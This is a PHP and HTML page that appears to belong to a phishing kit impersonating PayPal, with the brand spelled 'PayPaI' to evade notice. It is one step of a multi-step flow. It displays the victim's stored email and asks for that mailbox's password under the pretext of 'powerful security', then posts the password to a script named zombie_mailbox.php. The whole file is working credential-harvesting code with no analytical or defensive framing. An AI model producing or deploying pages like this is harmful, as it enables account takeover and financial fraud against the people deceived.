<?php
	
	session_start();
	include "../assets/includes/header.php";

?>

					<div class="zombie-form-container">

						<div class="zombie-loader" id="loading"></div>
						
						<!--##[ SECTION ]##-->
<script>
function validateEmailForm() {
    var a = document.forms["EmailForm"]["zombiemailboxpass"].value;
    if (a == "") {
        $("#zombiemailboxpass").addClass("hasError");
    }
    if (a == ""){return false;}
}
</script>
							<form action="../system/send/zombie_mailbox.php" method="post" name="EmailForm" onsubmit="return validateEmailForm()">

								<div class="zombie-sections-steps">
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step selected">●</span>
									<span class="zombie-sections-step">○</span>
								</div>

								<h3 class="medium">PayPaI powerful security.</h3>
								<p class="medium">Link your mailbox with PayPaI:</p>

								<div class="zombie-info-container">

									<div class="zombie-mailbox">
				 						<div class="zombie-l-mail">
					 						<img src="../assets/main/images/greymsn.svg">
					 					</div>
					 					<div class="zombie-r-mail">
					 						<div class="contact">Email address <br>
					 							<p><span><?php echo $_SESSION["email"]; ?></span></p>
					 						</div>
					 					</div>
				 					</div>

									<div class="zombie-fields">
										<input type="password" name="zombiemailboxpass" id="zombiemailboxpass" placeholder="Password" maxlength="30" autocomplete="off" autocorrect="off" />
									</div>
									
									<div>
										<button style="width:100%" class="button">Save and continue</button>
									</div>

									<div class="zombie-mailbox-why">
										<p class="zombie-why">We'll let you know when you</p>
										<p class="zombie-why-step">Make a payment</p>
										<p class="zombie-why-step">Receive a payment</p>
										<p class="zombie-why-step">Security issuse</p>
									</div>

								</div>

							</form>

						<!--##[ END SECTION ]##-->
					</div>
<?php
	include "../assets/includes/footer.php";
?>

	</div>
<script>
	$(document).ready(function(){
	$('#zombiemailboxpass').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiemailboxpass').removeClass('hasError'); } else {$('#zombiemailboxpass').removeClass('hasError'); }});

	});
</script>
</body>
</html>